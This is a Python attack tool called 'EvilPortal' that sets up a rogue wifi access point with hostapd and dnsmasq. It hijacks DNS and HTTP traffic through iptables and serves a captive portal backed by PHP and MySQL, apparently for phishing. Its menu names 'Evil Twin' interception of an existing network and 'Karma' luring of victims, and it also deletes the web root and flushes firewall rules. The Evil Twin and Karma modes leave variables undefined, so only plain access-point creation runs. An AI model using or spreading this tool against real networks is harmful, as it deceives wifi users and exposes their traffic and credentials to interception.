import os, re, random, requests, time, signal

tempFolder = '/tmp/evilportal'

def title():
    ret = '\n'
    ret += '███████╗██╗   ██╗██╗██╗     ██████╗  ██████╗ ██████╗ ████████╗ █████╗ ██╗     \n'
    ret += '██╔════╝██║   ██║██║██║     ██╔══██╗██╔═══██╗██╔══██╗╚══██╔══╝██╔══██╗██║     \n'
    ret += '█████╗  ██║   ██║██║██║     ██████╔╝██║   ██║██████╔╝   ██║   ███████║██║     \n'
    ret += '██╔══╝  ╚██╗ ██╔╝██║██║     ██╔═══╝ ██║   ██║██╔══██╗   ██║   ██╔══██║██║     \n'
    ret += '███████╗ ╚████╔╝ ██║███████╗██║     ╚██████╔╝██║  ██║   ██║   ██║  ██║███████╗\n'
    ret += '╚══════╝  ╚═══╝  ╚═╝╚══════╝╚═╝      ╚═════╝ ╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═╝╚══════╝\n'
    ret += '                                                       By: hacefresko         \n'

    return ret

class networkInterfaces:

    # Here we find directories representing current network interfaces named after them
    netIntDir = '/sys/class/net'

    dnsmasqLogFile = 'dnsmasq.log'
    hostapdLogFile = 'hostapd.log'

    def __init__(self):
        self.interfaces = []
        self.num = 0

        for dirpath, interfaces, filenames in os.walk(self.netIntDir):
            for interface in interfaces:
                if re.match(r'wlan\d', interface):
                    self.num = self.num + 1

                    # Directory /sys/class/net/<interface>/type contains 
                    # the mode in which the interface is operating:
                    #   1   -> managed
                    #   803 -> monitor
                    #
                    f = open(self.netIntDir + '/' + interface + '/type', 'r')
                    if f.read() == '803\n':
                        self.interfaces.append({'i' : self.num, 'name' : interface, 'mode' : 'monitor'})
                    else:
                        self.interfaces.append({'i' : self.num, 'name' : interface, 'mode' : 'managed'})
                    f.close()

    def __repr__(self):
        ret = '\nNETWORK INTERFACES\n\n'

        for interface in self.interfaces:
            if interface['mode'] == 'monitor':
                ret += '[{}] -> {} ({})\n'.format(interface['i'], interface['name'], interface['mode'])
            else:
                ret += '[{}] -> {}\n'.format(interface['i'], interface['name'])

        return ret

    def putInMonitor(self, nInterface):
        if type(nInterface) is not int:
            print('[x] Input value is not an integer!\n')
            return -1

        if nInterface < 0 or nInterface >= self.num:
            print('[x] Input value out of bounds!\n')
            return -1

        interface = self.interfaces[nInterface]

        if interface['mode'] == 'monitor':
            print('[x] Selected interface is already in monitor mode!\n')
            return -1
        
        print('[-] Configuring network interface...')

        os.system('ifconfig ' + interface['name'] + ' down')
        os.system('iw ' + interface['name'] + ' set type monitor')
        os.system('ifconfig ' + interface['name'] + ' up')

        f = open(self.netIntDir + '/' + interface['name'] + '/type', 'r')
        if f.read() != '803\n':
            print('[x] Newtork interface couldn\'t be put in monitor mode!\n')
            f.close()
            return -1
        f.close()
        print('[+] Network interface configured succesfuly')
        
        return 0

    def launchHostapd(self, nInterface, ssid, channel, encryption):
        if type(nInterface) is not int:
            print('[x] Input value is not an integer!\n')
            return -1

        if nInterface < 0 or nInterface >= self.num:
            print('[x] Input value out of bounds!\n')
            return -1

        interface = self.interfaces[nInterface]['name']
        
        # Hostapd configuration
        hostapdConfig = ''
        hostapdConfigFile = 'hostapd.conf'

        print('[-] Configuring hostapd...')
        if encryption == 'OPEN':
            hostapdConfig += 'interface=' + interface + '\n'
            hostapdConfig += 'driver=nl80211\n'
            hostapdConfig += 'ssid=' + ssid + '\n'
            hostapdConfig += 'hw_mode=g\n'
            hostapdConfig += 'channel=' + channel + '\n'
            hostapdConfig += 'macaddr_acl=0\n'
            hostapdConfig += 'auth_algs=1\n'
            hostapdConfig += 'ignore_broadcast_ssid=0\n'

        elif encryption == 'WPA2':
            password = input('\nWifi password [more than 8 chars]> ')
            print()

            hostapdConfig += 'interface=' + interface + '\n'
            hostapdConfig += 'driver=nl80211\n'
            hostapdConfig += 'ssid=' + ssid + '\n'
            hostapdConfig += 'hw_mode=g\n'
            hostapdConfig += 'wpa=2\n'
            hostapdConfig += 'wpa_passphrase=' + password + '\n'
            hostapdConfig += 'wpa_key_mgmt=WPA-PSK\n'
            hostapdConfig += 'wpa_pairwise=TKIP\n'
            hostapdConfig += 'rsn_pairwise=CCMP\n'
            hostapdConfig += 'channel=' + channel + '\n'
            hostapdConfig += 'macaddr_acl=0\n'
            hostapdConfig += 'auth_algs=3\n'
            hostapdConfig += 'ignore_broadcast_ssid=0\n'

        f = open(tempFolder + '/' + hostapdConfigFile, 'w')
        f.write(hostapdConfig)
        f.close()

        # Hostapd initialization
        os.system('hostapd ' + tempFolder + '/' + hostapdConfigFile + ' > ' + tempFolder + '/' + self.hostapdLogFile + ' &')
        print('[+] hostapd succesfuly configured')
        
        return 0

    def launchDnsmasq(self, nInterface):
        if type(nInterface) is not int:
            print('[x] Input value is not an integer!\n')
            return -1

        if nInterface < 0 or nInterface >= self.num:
            print('[x] Input value out of bounds!\n')
            return -1

        interface = self.interfaces[nInterface]['name']

        # Stop dnsmasq daemon in case it's active
        os.system('service dnsmasq stop')

        # Check connection
        print('[-] Checking for Internet connection...')
        try:
            requests.get('https://google.com')
            conex = True
            print('[+] Internet connection available')
        except:
            conex = False
            print('[x] Internet connection not available: Samsung devices won\'t connect')

        # Config dnsmasq
        dnsmasqConfig = ''
        dnsmasqConfigFile = 'dnsmasq.conf'
        dnsmasqHostsFile = 'hosts'

        print('[-] Configuring dnsmasq...')
        if conex:
            dnsmasqConfig += 'interface=' + interface + '\n'
            dnsmasqConfig += 'dhcp-range=10.0.0.10,10.0.0.250,255.255.255.0,12h\n'
            dnsmasqConfig += 'dhcp-option=3,10.0.0.1\n'
            dnsmasqConfig += 'dhcp-option=6,10.0.0.1\n'
            dnsmasqConfig += 'server=8.8.8.8\n'
            dnsmasqConfig += 'log-queries\n'
            dnsmasqConfig += 'listen-address=127.0.0.1\n'

            # iptables configuration only if machine has connection
            # We redirect to 10.0.0.1:80 everything going to port 80 of this machine
            os.system('iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination 10.0.0.1:80')

            # Everything going out this machine goes by eth0 and masqued
            os.system('iptables -t nat -A POSTROUTING --out-interface eth0 -j MASQUERADE')

        else:
            dnsmasqConfig += 'interface=' + interface + '\n'
            dnsmasqConfig += 'dhcp-range=10.0.0.10,10.0.0.250,255.255.255.0,12h\n'
            dnsmasqConfig += 'dhcp-option=3,10.0.0.1\n'
            dnsmasqConfig += 'dhcp-option=6,10.0.0.1\n'
            dnsmasqConfig += 'server=8.8.8.8\n'
            dnsmasqConfig += 'log-queries\n'
            dnsmasqConfig += 'listen-address=127.0.0.1\n'
            dnsmasqConfig += 'address=/#/10.0.0.1\n'

        f = open(tempFolder + '/' + dnsmasqConfigFile, 'w')
        f.write(dnsmasqConfig)
        f.close

        # Configures dnsmasq to assign the interface ip with the domain name so mod_rewrite
        # (.htaccess) can reffer directly to the domain name in the URL
        f = open(tempFolder + '/' + dnsmasqHostsFile, 'w')
        f.write('10.0.0.1 wifiportal2.aire.es')
        f.close()

        # Set inet address of interface to 10.0.0.1
        os.system('ifconfig ' + interface + ' 10.0.0.1')

        # Initialize dnsmasq
        os.system('dnsmasq -C ' + tempFolder + '/' + dnsmasqConfigFile + ' -H ' + tempFolder + '/' + dnsmasqHostsFile + ' --log-facility=' + tempFolder + '/' + self.dnsmasqLogFile)

        print('[+] dnsmasq succesfuly configured')

        return 0

hostapdFD = 0
dnsmasqFD = 0
def sigint_handler(sig, frame):
    print('\n[x] SIGINT: Exiting...')
    os.system('pkill hostapd')
    os.system('pkill dnsmasq')

    os.system('rm -r ' + tempFolder + ' 2>/dev/null')

    if hostapdFD != 0:
        hostapdFD.close()

    if dnsmasqFD != 0:
        dnsmasqFD.close()

    quit()


signal.signal(signal.SIGINT, sigint_handler)

print(title())

# Check for root priviledges
if os.getuid() != 0:
    print('[x] Please, run program as root!\n')
    quit()

networkInterfaces = networkInterfaces()

# Select network interface
if networkInterfaces.num == 0:
    print('[x] No network interface detected!\n')
    quit()

elif networkInterfaces.num == 1:
    if networkInterfaces.interfaces[0]['mode'] != 'monitor':
        if networkInterfaces.putInMonitor(0) != 0:
            quit()
    interface = 0

elif networkInterfaces.num > 1:
    ok = -1
    while ok != 0: 
        print(networkInterfaces)
        interface = int(input('Select network interface > '))
        print()
        if interface < 0 or interface >= networkInterfaces.num: 
            print('[x] Input value out of bounds!')
        else:
            if networkInterfaces.interfaces[interface]['mode'] != 'monitor':
                ok = networkInterfaces.putInMonitor(interface)
            else:
                ok = 0

print('[+] Network Interface in use: ' + networkInterfaces.interfaces[interface]['name'])

# Create temp folder
try:
    os.makedirs(tempFolder)
except OSError:
    print('[-] Temporal directory ' + tempFolder + ' already exists')

# Flush iptables to avoid conflicts
print ('[-] Flushing iptables...')
os.system('iptables -F')
os.system('iptables -t nat -F')
print('[+] Iptables flushed')

# Select operation mode
op = -1
while op < 1 or op > 3:
    print('\nOPERATION MODE')
    print('[1] -> Create new acces point')
    print('[2] -> [Evil Twin] Intercept existing access point')
    print('[3] -> [Karma] Create acces point recogniced by victim')
    op = int(input(' > '))
    print()

    if op == 1:
        deauth = False
        ssid = input('WiFi SSID > ')
        channel = input('Channel > ')

        encr = -1
        print('\nSecurity:')
        while encr < 1 or encr > 2:
            print('[1] -> Open')
            print('[2] -> WPA2')
            encr = int(input(' > '))
            if encr < 1 or encr > 2:
                print('[x] Input value out of bounds!\n')
            elif encr == 1:
                encryption = "OPEN"
            elif encr == 2:
                encryption = "WPA2"
        print()

    elif op == 2:
        deauth = True

    elif op == 3:
        deauth = False

    else:
        print('[x] Input value out of bounds!\n')


# Launch hostapd
networkInterfaces.launchHostapd(interface, ssid, channel, encryption)

# Launch dnsmasq
networkInterfaces.launchDnsmasq(interface)

# Config captive portal files
os.system('rm -r /var/www/html/* 2>/dev/null')
os.system('cp -r captive /var/www/html/captive')
os.system('cp .htaccess /var/www/html')
os.system('chmod 755 /var/www/html/.htaccess')
os.system('chmod 755 /var/www/html/captive')
os.system('chmod 755 /var/www/html/captive/*')

# Enable rewrite and override for .htaccess and php
print('[-] Configuring apache2...\n')
os.system('cp -f override.conf /etc/apache2/conf-available/')
os.system('a2enconf override')
os.system('a2enmod rewrite')
os.system('a2enmod php7.3')

# Reload/restart apache2 and start mysql (mariaDB)
os.system('service apache2 reload')
os.system('service apache2 restart')
print('\n[+] apache2 configured succesfuly')
print('[-] Configuring mysql...')
os.system('service mysql start')
print('[+] mysql configured succesfuly')

# Print hostapd + dnsmasq
hostapdFD = open(tempFolder + '/' + networkInterfaces.hostapdLogFile, 'r')
dnsmasqFD = open(tempFolder + '/' + networkInterfaces.dnsmasqLogFile, 'r')
prev = ''
while True:
    hostapdLog = hostapdFD.read()
    if hostapdLog:
        if prev != 'hostapd':
            print('\n[HOSTAPD]')
        print(hostapdLog, end = '')
        prev = 'hostapd'

    dnsmasqLog = dnsmasqFD.read()
    if dnsmasqLog:
        if prev != 'dnsmasq':
            print('\n[DNSMASQ]')
        print(dnsmasqLog, end = '')
        prev = 'dnsmasq'

    time.sleep(1)

